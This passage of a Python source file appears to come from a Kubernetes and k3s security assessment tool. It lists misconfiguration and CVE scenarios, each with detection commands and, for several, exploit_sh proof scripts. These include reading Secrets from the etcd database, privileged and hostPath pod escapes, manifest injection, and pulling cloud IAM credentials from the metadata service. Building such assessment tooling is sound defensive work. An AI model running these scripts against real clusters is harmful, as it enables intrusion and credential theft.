        exploit_sh='out=$(curl -sk --max-time 4 https://127.0.0.1:10250/pods 2>/dev/null | head -c 200); echo "anon kubelet /pods ($MARKER): $out"; echo "$out" | grep -q "PodList"'),

    Scenario("K8-07", Kind.K8S, Repro.CONFIG, "namespace without PSA enforce=restricted",
        "HIGH", triage_ref="D3", confidence=C.DOCUMENTED,
        note="A namespace not enforcing Pod Security 'restricted' will admit a privileged pod.",
        detect_sh="kubectl get ns -o json 2>/dev/null | jq -e -r '.items[] | select(.metadata.name|startswith(\"kube-\")|not) | select((.metadata.labels[\"pod-security.kubernetes.io/enforce\"]//\"\")!=\"restricted\") | .metadata.name'",
        exploit_sh=(
            'kubectl create ns esc-x >/dev/null 2>&1\n'
            'kubectl -n esc-x run esc-x-k807 --image=alpine --restart=Never --privileged --command -- sleep 20 >/dev/null 2>&1\n'
            'ok=1; kubectl -n esc-x wait --for=condition=Ready pod/esc-x-k807 --timeout=40s >/dev/null 2>&1 && ok=0\n'
            'kubectl delete ns esc-x --wait=false >/dev/null 2>&1\n'
            'echo "privileged pod admitted + Running in a non-restricted ns ($MARKER)"; exit $ok')),

    Scenario("K8-08", Kind.K8S, Repro.CONFIG, "NET_RAW ARP/DNS spoof between co-located pods",
        "MEDIUM", triage_ref="", confidence=C.DOCUMENTED,
        note="Pods retaining NET_RAW on a shared pod network can ARP/DNS-spoof each other (no triage check).",
        detect_sh=_pods_any('(.metadata.namespace|startswith("kube-")|not) and ([.spec.containers[]?.securityContext.capabilities.drop//[] | .[]] | any(.=="ALL" or .=="NET_RAW") | not)'),
        exploit_sh=(
            'kubectl create ns esc-x >/dev/null 2>&1\n'
            'kubectl -n esc-x run esc-x-k808a --image=nicolaka/netshoot --restart=Never --command -- sleep 120 >/dev/null 2>&1\n'
            'kubectl -n esc-x run esc-x-k808b --image=nicolaka/netshoot --restart=Never --command -- sleep 120 >/dev/null 2>&1\n'
            'kubectl -n esc-x wait --for=condition=Ready pod/esc-x-k808a pod/esc-x-k808b --timeout=90s >/dev/null 2>&1\n'
            'ip=$(kubectl -n esc-x get pod esc-x-k808b -o jsonpath="{.status.podIP}" 2>/dev/null)\n'
            'out=$(kubectl -n esc-x exec esc-x-k808a -- arping -c2 -w3 "$ip" 2>/dev/null | tr "\\n" " ")\n'
            'kubectl delete ns esc-x --wait=false >/dev/null 2>&1\n'
            'echo "NET_RAW L2 probe pod-a -> pod-b $ip ($MARKER): $out"\n'
            'echo "$out" | grep -qi "reply"')),

    Scenario("K8-09", Kind.K8S, Repro.CONFIG, "embedded etcd read bypassing RBAC",
        "CRITICAL", triage_ref="D14", confidence=C.DOCUMENTED,
        note="Root on the node can read Secrets straight from the on-disk etcd db, bypassing RBAC.",
        detect_sh='f=/var/lib/rancher/k3s/server/db/etcd/member/snap/db; test -r "$f" && echo "readable etcd db: $f"',
        exploit_sh=(
            'f=/var/lib/rancher/k3s/server/db/etcd/member/snap/db\n'
            'kubectl create ns esc-x >/dev/null 2>&1\n'
            'kubectl -n esc-x create secret generic esc-x-k809 --from-literal=canary=$MARKER >/dev/null 2>&1; sleep 2\n'
            'ok=1; strings "$f" 2>/dev/null | grep -q "$MARKER" && ok=0\n'
            'kubectl delete ns esc-x --wait=false >/dev/null 2>&1\n'
            'echo "Secret canary read in cleartext from on-disk etcd ($MARKER)"; exit $ok')),

    Scenario("K8-10", Kind.K8S, Repro.CONFIG, "static-pod manifest directory writable",
        "HIGH", triage_ref="D8", confidence=C.DOCUMENTED,
        note="A world-writable k3s manifests dir auto-applies any dropped manifest as cluster root.",
        detect_sh='d=/var/lib/rancher/k3s/server/manifests; test -d "$d" && { p=$(stat -c "%a" "$d"); echo "$d $p"; [ $(( 0$p & 022 )) -ne 0 ]; }',
        exploit_sh=(
            'd=/var/lib/rancher/k3s/server/manifests; [ -d "$d" ] || exit 1\n'
            'cat > "$d/esc-x-k810.yaml" <<EOF\n'
            'apiVersion: v1\nkind: Namespace\nmetadata: {name: esc-x-k810, labels: {marker: "$MARKER"}}\nEOF\n'
            'sleep 6; ok=1; kubectl get ns esc-x-k810 >/dev/null 2>&1 && ok=0\n'
            'rm -f "$d/esc-x-k810.yaml" 2>/dev/null; kubectl delete ns esc-x-k810 --wait=false >/dev/null 2>&1\n'
            'echo "dropped manifest auto-applied by k3s as root ($MARKER)"; exit $ok')),

    Scenario("K8-11", Kind.K8S, Repro.CONFIG, "node admin kubeconfig left group/world-readable",
        "HIGH", triage_ref="D9", confidence=C.DOCUMENTED,
        note="A readable /etc/rancher/k3s/k3s.yaml is cluster-admin for any local user.",
        detect_sh='f=/etc/rancher/k3s/k3s.yaml; test -f "$f" && { p=$(stat -c "%a" "$f"); echo "$f $p"; [ $(( 0$p & 044 )) -ne 0 ]; }',
        exploit_sh=(
            'f=/etc/rancher/k3s/k3s.yaml; [ -r "$f" ] || exit 1\n'
            'out=$(KUBECONFIG="$f" kubectl auth can-i "*" "*" --all-namespaces 2>/dev/null)\n'
            'echo "cluster-admin via world-readable kubeconfig ($MARKER): can-i *.*=$out"\n'
            'echo "$out" | grep -qx yes')),

    Scenario("K8-12", Kind.K8S, Repro.CONFIG, "apiserver anonymous-auth",
        "CRITICAL", triage_ref="D4", confidence=C.DOCUMENTED,
        note="Anonymous apiserver lets system:anonymous reach the API (impact depends on anon RBAC).",
        detect_sh='code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 https://127.0.0.1:6443/api 2>/dev/null); echo "apiserver /api (anon) -> $code"; [ "$code" = 200 ]',
        exploit_sh='out=$(curl -sk --max-time 4 https://127.0.0.1:6443/api 2>/dev/null | head -c 160); echo "anon apiserver discovery ($MARKER): $out"; echo "$out" | grep -q "APIVersions"'),

    Scenario("K8-13", Kind.K8S, Repro.CONFIG, "system:anonymous bound to a ClusterRole",
        "CRITICAL", triage_ref="D1", confidence=C.CONCRETE,
        note="Any binding to system:anonymous grants unauthenticated cluster access.",
        detect_sh="kubectl get clusterrolebindings,rolebindings -A -o json 2>/dev/null | jq -e -r '.items[] | select(.subjects[]? | .name==\"system:anonymous\") | .metadata.name'",
        exploit_sh=(
            'out=$(kubectl --as=system:anonymous get pods -A -o name 2>/dev/null | head -1)\n'
            'echo "anonymous cluster read ($MARKER): ${out:-none}"\n'
            '[ -n "$out" ]')),

    Scenario("K8-14", Kind.K8S, Repro.CONFIG, "ServiceAccount can create PersistentVolumes (hostPath)",
        "HIGH", triage_ref="D1", confidence=C.DOCUMENTED,
        note="create-persistentvolumes lets a token map the node filesystem into the cluster via a hostPath PV.",
        detect_fn=rbac_detector("create", "persistentvolumes", "SA can create PersistentVolumes"),
        exploit_sh=(
            'kubectl apply -f - >/dev/null 2>&1 <<EOF\n'
            'apiVersion: v1\nkind: PersistentVolume\nmetadata: {name: esc-x-k814, labels: {marker: "$MARKER"}}\n'
            'spec:\n  capacity: {storage: 1Gi}\n  accessModes: [ReadWriteOnce]\n  hostPath: {path: /}\nEOF\n'
            'ok=1; kubectl get pv esc-x-k814 -o jsonpath="{.spec.hostPath.path}" 2>/dev/null | grep -qx / && ok=0\n'
            'kubectl delete pv esc-x-k814 --wait=false >/dev/null 2>&1\n'
            'echo "hostPath PV mapping node / created ($MARKER)"; exit $ok')),

    Scenario("K8-15", Kind.K8S, Repro.CONFIG, "ServiceAccount can create pods/ephemeralcontainers",
        "HIGH", triage_ref="D11", confidence=C.DOCUMENTED,
        note="ephemeralcontainers injection drops a debug container into a running pod (exec foothold).",
        detect_fn=rbac_detector("create", "pods/ephemeralcontainers", "SA can create pods/ephemeralcontainers"),
        exploit_sh=(
            'kubectl create ns esc-x >/dev/null 2>&1\n'
            'kubectl -n esc-x run esc-x-k815 --image=alpine --restart=Never --command -- sleep 120 >/dev/null 2>&1\n'
            'kubectl -n esc-x wait --for=condition=Ready pod/esc-x-k815 --timeout=60s >/dev/null 2>&1\n'
            'ok=1; kubectl -n esc-x debug esc-x-k815 --image=alpine --target=esc-x-k815 -- sh -c "echo $MARKER" >/dev/null 2>&1 \\\n'
            '  && kubectl -n esc-x get pod esc-x-k815 -o json 2>/dev/null | jq -e ".spec.ephemeralContainers|length>0" >/dev/null && ok=0\n'
            'kubectl delete ns esc-x --wait=false >/dev/null 2>&1\n'
            'echo "ephemeral/debug container injected into a running pod ($MARKER)"; exit $ok')),

    Scenario("K8-16", Kind.K8S, Repro.CONFIG, "ClusterRole grants escalate/bind",
        "HIGH", triage_ref="D12", confidence=C.DOCUMENTED,
        note="escalate/bind on roles lets a principal self-grant any ClusterRole, defeating RBAC.",
        detect_sh="kubectl get clusterroles -o json 2>/dev/null | jq -e -r '.items[] | select(.rules[]? | ((.resources[]?|test(\"clusterroles|roles\")) and (.verbs[]?|test(\"^(escalate|bind)$\")))) | .metadata.name'",
        exploit_sh=(
            'r=$(kubectl get clusterroles -o json 2>/dev/null | jq -r \'.items[] | select(.rules[]? | ((.resources[]?|test("clusterroles|roles")) and (.verbs[]?|test("^(escalate|bind)$")))) | .metadata.name\' | head -1)\n'
            'echo "ClusterRole granting escalate/bind present ($MARKER): ${r:-none} — a bound principal can self-grant cluster-admin"\n'
            '[ -n "$r" ]')),

    Scenario("K8-17", Kind.K8S, Repro.CONFIG, "Secrets stored unencrypted in etcd",
        "MEDIUM", triage_ref="D10", confidence=C.DOCUMENTED,
        note="k3s without --secrets-encryption stores Secrets as cleartext in etcd (pairs with K8-09).",
        detect_sh='line=$(ps -eo args 2>/dev/null | grep -E "[k]3s server" | head -1); [ -n "$line" ] || exit 1; echo "$line" | grep -q -- --secrets-encryption && exit 1; echo "k3s server running without --secrets-encryption"',
        exploit_sh=(
            'f=/var/lib/rancher/k3s/server/db/etcd/member/snap/db\n'
            'kubectl create ns esc-x >/dev/null 2>&1\n'
            'kubectl -n esc-x create secret generic esc-x-k817 --from-literal=canary=$MARKER >/dev/null 2>&1; sleep 2\n'
            'ok=1; strings "$f" 2>/dev/null | grep -q "$MARKER" && ok=0\n'
            'kubectl delete ns esc-x --wait=false >/dev/null 2>&1\n'
            'echo "Secret stored in cleartext in etcd (no encryption-at-rest) ($MARKER)"; exit $ok')),

    Scenario("K8-18", Kind.K8S, Repro.VERSION, "pidfd FD-steal (seccomp unset + namespace not Restricted)",
        "HIGH", triage_ref="D13", detect_fn=_kernel_precondition("pidfd FD-steal (CVE-2026-46333) needs a vulnerable kernel — verify against the advisory")),

    # --- dangerous RBAC grants to a non-system ServiceAccount (read-only RBAC correlation) ---
    Scenario("K8-19", Kind.K8S, Repro.CONFIG, "SA can create pods/exec (exec into any pod)",
        "HIGH", confidence=C.PRECONDITION, note="grant present; exploited by using the SA token to exec into a pod and pivot — targeted.",
        detect_fn=rbac_detector("create", "pods/exec", "SA can exec into pods")),
    Scenario("K8-20", Kind.K8S, Repro.CONFIG, "SA can create pods/attach (attach to any pod)",
        "HIGH", confidence=C.PRECONDITION, note="grant present; attach to a running container via the SA token — targeted.",
        detect_fn=rbac_detector("create", "pods/attach", "SA can attach to pods")),
    Scenario("K8-21", Kind.K8S, Repro.CONFIG, "SA can read Secrets cluster-wide (get/list secrets)",
        "CRITICAL", confidence=C.PRECONDITION, note="grant present; read every Secret (SA tokens, TLS keys) with the SA token — targeted.",
        detect_fn=rbac_detector("get", "secrets", "SA can read secrets")),
    Scenario("K8-22", Kind.K8S, Repro.CONFIG, "SA can create serviceaccounts/token (TokenRequest)",
        "HIGH", confidence=C.PRECONDITION, note="grant present; mint tokens for other ServiceAccounts -> impersonation — targeted.",
        detect_fn=rbac_detector("create", "serviceaccounts/token", "SA can mint SA tokens")),
    Scenario("K8-23", Kind.K8S, Repro.CONFIG, "SA granted impersonate (users/groups/serviceaccounts)",
        "CRITICAL", confidence=C.PRECONDITION, note="grant present; impersonate cluster-admin via the SA token — targeted.",
        detect_fn=rbac_detector("impersonate", "users", "SA can impersonate")),
    Scenario("K8-24", Kind.K8S, Repro.CONFIG, "SA can approve certificatesigningrequests",
        "CRITICAL", confidence=C.PRECONDITION, note="create CSR + approve -> mint a client cert for any group incl system:masters — targeted.",
        detect_fn=rbac_detector("approve", "certificatesigningrequests", "SA can approve CSRs")),
    Scenario("K8-25", Kind.K8S, Repro.CONFIG, "SA can create pod-spawning workloads (Deployments/Jobs/…)",
        "CRITICAL", confidence=C.PRECONDITION, note="create a Deployment/DaemonSet/Job with a privileged/hostPath pod template -> node root — targeted.",
        detect_fn=rbac_detector("create", "deployments", "SA can create workloads")),
    Scenario("K8-26", Kind.K8S, Repro.CONFIG, "SA granted nodes/proxy (reach each node's kubelet)",
        "CRITICAL", confidence=C.PRECONDITION, note="proxy to kubelet /exec on any node -> command execution on the node — targeted.",
        detect_fn=rbac_detector("get", "nodes/proxy", "SA can proxy to nodes")),
    Scenario("K8-27", Kind.K8S, Repro.CONFIG, "SA can create mutatingwebhookconfigurations",
        "CRITICAL", confidence=C.PRECONDITION, note="register a mutating webhook to inject sidecars / tamper every admission -> cluster takeover — targeted.",
        detect_fn=rbac_detector("create", "mutatingwebhookconfigurations", "SA can create mutating webhooks")),
    Scenario("K8-28", Kind.K8S, Repro.CONFIG, "SA can create validatingwebhookconfigurations",
        "HIGH", confidence=C.PRECONDITION, note="register a validating webhook to intercept objects (incl Secrets) or deny security policy — targeted.",
        detect_fn=rbac_detector("create", "validatingwebhookconfigurations", "SA can create validating webhooks")),
    Scenario("K8-29", Kind.K8S, Repro.CONFIG, "SA bound to a wildcard rule (apiGroups/resources/verbs *)",
        "CRITICAL", confidence=C.PRECONDITION, note="effective cluster-admin via the SA token.",
        detect_fn=rbac_detector("*", "*", "SA has wildcard RBAC")),

    # --- Kubernetes node / component posture (read-only) ---
    Scenario("K8-30", Kind.K8S, Repro.CONFIG, "kubelet read-only port :10255 exposed",
        "HIGH", confidence=C.DOCUMENTED, note="legacy unauthenticated HTTP read-only port — leaks pods, env, tokens.",
        detect_sh='code=$(curl -s --max-time 3 -o /dev/null -w "%{http_code}" http://127.0.0.1:10255/pods 2>/dev/null); echo "kubelet ro-port 10255 -> ${code:-closed}"; [ "$code" = 200 ]',
        exploit_sh='out=$(curl -s --max-time 4 http://127.0.0.1:10255/pods 2>/dev/null | head -c 160); echo "unauth kubelet 10255 /pods ($MARKER): $out"; echo "$out" | grep -q PodList'),
    Scenario("K8-31", Kind.K8S, Repro.CONFIG, "network-reachable etcd (2379/2380) without client-cert auth",
        "CRITICAL", confidence=C.DOCUMENTED, note="unauthenticated etcd is the whole cluster's secrets/state (distinct from K8-09's on-disk read).",
        detect_sh='h=$(curl -sk --max-time 3 -o /dev/null -w "%{http_code}" https://127.0.0.1:2379/version 2>/dev/null); p=$(curl -s --max-time 3 -o /dev/null -w "%{http_code}" http://127.0.0.1:2379/version 2>/dev/null); echo "etcd 2379 https=$h http=$p (200 w/o client cert = unauth)"; [ "$h" = 200 ] || [ "$p" = 200 ]',
        exploit_sh='out=$(curl -sk --max-time 4 https://127.0.0.1:2379/version 2>/dev/null || curl -s --max-time 4 http://127.0.0.1:2379/version 2>/dev/null); echo "etcd reachable without a client cert ($MARKER): ${out}"; [ -n "$out" ]'),
    Scenario("K8-32", Kind.K8S, Repro.CONFIG, "kubelet authorization-mode=AlwaysAllow",
        "CRITICAL", confidence=C.PRECONDITION, note="kubelet authorizes every request (even with any node credential) -> /exec on any pod. Distinct from K8-06 anon-auth.",
        detect_sh='grep -rsqE "authorization-?mode[:=] ?AlwaysAllow" /etc/rancher/k3s /var/lib/kubelet/config.yaml /etc/kubernetes /etc/default/kubelet 2>/dev/null && echo "kubelet authorization-mode=AlwaysAllow configured"'),
    Scenario("K8-33", Kind.K8S, Repro.CONFIG, "kubeadm static-pod manifests dir writable (/etc/kubernetes/manifests)",
        "CRITICAL", confidence=C.PRECONDITION, note="kubelet runs any manifest dropped here as a static pod — as root on the node (kubeadm path; K8-10 is the k3s addon path).",
        detect_sh='d=/etc/kubernetes/manifests; test -d "$d" && { p=$(stat -c "%a" "$d"); echo "$d $p"; [ $(( 0$p & 022 )) -ne 0 ]; }'),
    Scenario("K8-34", Kind.K8S, Repro.CONFIG, "pod hostPath-mounts a sensitive node path (socket / kubelet / pki / proc)",
        "CRITICAL", confidence=C.PRECONDITION, note="a hostPath other than '/' (container-runtime socket, /var/lib/kubelet, /etc/kubernetes, /proc, /dev) is an equal-or-worse node compromise; K8-03 only matches '/'.",
        detect_sh=_pods_any('[.spec.volumes[]?.hostPath.path] as $ps | ' +
            '["' + '","'.join([p for p in _SENSITIVE_HOSTPATHS if p != "/"]) + '"] as $s | ($ps | any(. as $p | $s | index($p)))')),
    Scenario("K8-35", Kind.K8S, Repro.CONFIG, "kubeadm admin.conf or cluster CA key group/world-readable",
        "CRITICAL", confidence=C.PRECONDITION, note="/etc/kubernetes/admin.conf is cluster-admin; /etc/kubernetes/pki/ca.key mints any cert. K8-11 is the k3s kubeconfig only.",
        detect_sh='for f in /etc/kubernetes/admin.conf /etc/kubernetes/pki/ca.key; do test -f "$f" && { p=$(stat -c "%a" "$f"); [ $(( 0$p & 044 )) -ne 0 ] && echo "$f $p readable"; }; done | grep .'),
    Scenario("K8-36", Kind.K8S, Repro.CONFIG, "pod requests dangerous Linux capabilities (securityContext.capabilities.add)",
        "HIGH", confidence=C.PRECONDITION, note="a non-privileged pod adding SYS_ADMIN/SYS_MODULE/SYS_PTRACE/BPF/… — the k8s-side analog of DK-03..06 (no existing K8 check).",
        detect_sh=_pods_any('(.metadata.namespace|startswith("kube-")|not) and (' + _POD_CAP_ADD + ')')),
    Scenario("K8-37", Kind.K8S, Repro.CONFIG, "legacy long-lived ServiceAccount-token Secrets present",
        "HIGH", confidence=C.PRECONDITION, note="never-expiring SA tokens (type kubernetes.io/service-account-token) are stealable, replayable credentials; prefer bound TokenRequest tokens.",
        detect_sh='kubectl get secrets -A --field-selector type=kubernetes.io/service-account-token -o name 2>/dev/null | grep .'),
    Scenario("K8-38", Kind.K8S, Repro.CONFIG, "no cluster-wide admission guardrail (no namespace enforces PodSecurity restricted)",
        "MEDIUM", confidence=C.PRECONDITION, note="without PSA enforce=restricted anywhere (and no admission webhook), a privileged/hostPath pod is admitted everywhere. Broader than K8-07 (single ns).",
        detect_sh='kubectl get ns -o json 2>/dev/null | jq -e -r \'[.items[]|select(.metadata.name|startswith("kube-")|not)|select((.metadata.labels["pod-security.kubernetes.io/enforce"]//"")=="restricted")]|length==0\' >/dev/null && echo "no non-system namespace enforces PodSecurity restricted"'),
    Scenario("K8-39", Kind.K8S, Repro.CONFIG, "ServiceAccount token auto-mounted into pods",
        "MEDIUM", confidence=C.PRECONDITION, note="automountServiceAccountToken not disabled — a compromised pod gets a live API token by default (posture).",
        detect_sh=_pods_any('(.metadata.namespace|startswith("kube-")|not) and ((.spec.automountServiceAccountToken // true) == true) and ((.spec.serviceAccountName // "default") != "default")')),
    Scenario("K8-40", Kind.K8S, Repro.CONFIG, "no default-deny NetworkPolicy (flat pod network)",
        "MEDIUM", confidence=C.PRECONDITION, note="zero NetworkPolicies -> any pod reaches every pod, the API server, and node-local services (lateral movement).",
        detect_sh='n=$(kubectl get networkpolicy -A -o name 2>/dev/null | wc -l); echo "NetworkPolicies cluster-wide: $n"; [ "$n" -eq 0 ]'),
    Scenario("K8-41", Kind.K8S, Repro.CONFIG, "pod with shareProcessNamespace: true",
        "MEDIUM", confidence=C.PRECONDITION, note="containers in the pod share one PID ns — a sidecar can read another container's /proc memory and fds.",
        detect_sh=_pods_any('.spec.shareProcessNamespace==true')),
    Scenario("K8-42", Kind.K8S, Repro.CONFIG, "pod runs as root (no runAsNonRoot / runAsUser 0)",
        "MEDIUM", confidence=C.PRECONDITION, note="neither pod nor container sets runAsNonRoot:true — processes run as uid 0, amplifying any other weakness (posture).",
        detect_sh=_pods_any('(.metadata.namespace|startswith("kube-")|not) and ((.spec.securityContext.runAsNonRoot // false) != true) and (all(.spec.containers[]?; (.securityContext.runAsNonRoot // false) != true))')),
    Scenario("K8-43", Kind.K8S, Repro.CONFIG, "pod binds a hostPort",
        "MEDIUM", confidence=C.PRECONDITION, note="a hostPort publishes the container on the node's network, bypassing Service/NetworkPolicy and exposing it on the node IP.",
        detect_sh=_pods_any('(.metadata.namespace|startswith("kube-")|not) and any(.spec.containers[]?.ports[]?; .hostPort != null)')),

    # --- Kubernetes CVEs (version/config, detect-only) ---
    Scenario("K8-44", Kind.K8S, Repro.VERSION, "kube-apiserver proxy/upgrade privilege escalation",
        "CRITICAL", note="CVE-2018-1002105 — fixed in 1.10.11/1.11.5/1.12.3 (coarse compare).",
        detect_fn=_version_lt("kube-apiserver", "kubectl version -o json 2>/dev/null | jq -r '.serverVersion.gitVersion // empty'",
                              r"v?([0-9]+\.[0-9]+\.[0-9]+)", "1.12.3", tool="kubectl")),
    Scenario("K8-45", Kind.K8S, Repro.CONFIG, "gitRepo volume in use (deprecated; kubelet runs git clone as root)",
        "HIGH", confidence=C.PRECONDITION, note="CVE-2024-10220 — a gitRepo volume lets a crafted repo run hooks as root on the node. Any gitRepo-volume pod is a finding.",
        detect_sh=_pods_any('any(.spec.volumes[]?; has("gitRepo"))')),
    Scenario("K8-46", Kind.K8S, Repro.VERSION, "kubelet subPath symlink-swap race",
        "HIGH", note="CVE-2021-25741 — fixed in 1.19.16/1.20.11/1.21.5/1.22.0 (coarse compare <1.22).",
        detect_fn=_version_lt("kubelet", "kubectl version -o json 2>/dev/null | jq -r '.serverVersion.gitVersion // empty'",
                              r"v?([0-9]+\.[0-9]+\.[0-9]+)", "1.22.0", tool="kubectl")),
    Scenario("K8-47", Kind.K8S, Repro.VERSION, "ingress-nginx IngressNightmare unauthenticated RCE",
        "CRITICAL", note="CVE-2025-1974 (+1097/1098/24513/24514) — fixed ingress-nginx 1.11.5 / 1.12.1 (coarse <1.11.5).",
        detect_fn=lambda ctx: (Detection(None, "kubectl not found") if not ctx.have("kubectl") else
            (lambda img: (lambda m: Detection(bool(m) and _ver_tuple(m.group(1)) < (1, 11, 5),
                f"ingress-nginx controller {m.group(1) if m else 'not detected'}"))(
                re.search(r"controller[^\s:]*:v?([0-9]+\.[0-9]+\.[0-9]+)", img)))(
                ctx.sh("kubectl get pods -A -o jsonpath='{range .items[*]}{range .spec.containers[*]}{.image}{\"\\n\"}{end}{end}' 2>/dev/null | grep ingress-nginx/controller | head -1")[1]))),
    Scenario("K8-48", Kind.K8S, Repro.VERSION, "CRI-O cr8escape (pod-supplied sysctl -> host command exec)",
        "CRITICAL", note="CVE-2022-0811 — fixed CRI-O 1.19.6/1.20.7/1.21.6/1.22.3/1.23.2 (coarse <1.23.2).",
        detect_fn=_version_lt("cri-o", "crio --version 2>/dev/null", r"([0-9]+\.[0-9]+\.[0-9]+)", "1.23.2", tool="crio")),
    Scenario("K8-49", Kind.K8S, Repro.VERSION, "kernel fs_context heap overflow (LPE from a pod)",
        "HIGH", note="CVE-2022-0185 — unprivileged-userns reachable; fixed ~5.16.2 / distro backports (coarse <5.17).",
        detect_fn=_kernel_lt("kernel (CVE-2022-0185 fs_context)", "5.17")),

    # --- cloud metadata / supply-chain / secrets ---
    Scenario("K8-50", Kind.K8S, Repro.CONFIG, "cloud IMDS credential theft reachable from the node/pods (AWS/GCP/Azure)",
        "CRITICAL", confidence=C.DOCUMENTED, note="a reachable instance-metadata service hands a pod the node's cloud IAM role creds -> cloud account pivot. (The real-cloud counterpart to the Proxmox n-a stub.)",
        detect_sh='a=$(curl -s --max-time 2 -o /dev/null -w "%{http_code}" http://169.254.169.254/latest/meta-data/ 2>/dev/null); g=$(curl -s --max-time 2 -H "Metadata-Flavor: Google" -o /dev/null -w "%{http_code}" http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null); z=$(curl -s --max-time 2 -H "Metadata:true" -o /dev/null -w "%{http_code}" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null); echo "IMDS aws=$a gcp=$g azure=$z"; [ "$a" = 200 ] || [ "$g" = 200 ] || [ "$z" = 200 ]',
        exploit_sh='r=$(curl -s --max-time 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null | head -1); c=""; [ -n "$r" ] && c=$(curl -s --max-time 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/$r" 2>/dev/null); g=$(curl -s --max-time 3 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null); echo "cloud creds ($MARKER): aws-role=${r:-none} gcp-token=${g:+present}"; echo "$c$g" | grep -qiE "AccessKeyId|access_token"'),
    Scenario("K8-51", Kind.K8S, Repro.CONFIG, "imagePullSecrets / dockerconfigjson present (registry creds)",
        "MEDIUM", confidence=C.PRECONDITION, note="pods/SAs referencing a dockerconfigjson secret — a compromised pod can read and reuse the registry credential.",
        detect_sh='kubectl get secrets -A --field-selector type=kubernetes.io/dockerconfigjson -o name 2>/dev/null | grep .'),
    Scenario("K8-52", Kind.K8S, Repro.CONFIG, "secrets embedded in ConfigMaps / container env literals",
        "HIGH", confidence=C.PRECONDITION, note="credential-looking keys with literal values in ConfigMaps (or container env .value) — unencrypted, broadly readable. Heuristic.",
        detect_sh='kubectl get configmaps -A -o json 2>/dev/null | jq -e -r \'.items[]|select(.metadata.namespace|startswith("kube-")|not)|select((.data//{})|to_entries[]?|((.key|test("(?i)pass|secret|token|apikey|api_key|private[_-]?key|credential")) and ((.value//"")|length>0)))|"\\(.metadata.namespace)/\\(.metadata.name)"\''),
    Scenario("K8-53", Kind.K8S, Repro.CONFIG, "unpinned / mutable image references (:latest or no digest)",
        "MEDIUM", confidence=C.PRECONDITION, note="images by :latest or a bare tag (no @sha256 digest) are mutable — a registry compromise silently swaps the running code (supply-chain).",
        detect_sh=_pods_any('(.metadata.namespace|startswith("kube-")|not) and any(.spec.containers[]?.image; test(":latest$") or (test("[:@]")|not))')),
    Scenario("K8-54", Kind.K8S, Repro.CONFIG, "legacy Helm v2 Tiller in-cluster (unauthenticated :44134)",
        "CRITICAL", confidence=C.DOCUMENTED, note="Tiller runs with cluster-admin and (classically) no auth on tcp/44134 — anyone in-cluster installs privileged workloads.",
        detect_sh='svc=$(kubectl get svc,deploy,pods -A 2>/dev/null | grep -c -i tiller); echo "tiller objects: $svc"; [ "$svc" -gt 0 ]',
        exploit_sh='out=$(kubectl get svc,deploy,pods -A 2>/dev/null | grep -i tiller | head -2 | tr "\\n" " "); echo "Helm v2 Tiller present ($MARKER): $out"; [ -n "$out" ]'),

    Scenario("K8-NA", Kind.K8S, Repro.NA, "cloud IMDS (169.254.169.254) — not present on Proxmox",
        "INFO", triage_ref="",
        detect_sh='code=$(curl -s --max-time 2 -o /dev/null -w "%{http_code}" http://169.254.169.254/latest/meta-data/ 2>/dev/null); echo "IMDS -> ${code:-unreachable}"; [ "$code" = 200 ]'),
]

BY_ID = {s.id: s for s in SCENARIOS}


def get(scenario_id: str):
    return BY_ID.get(scenario_id.upper())
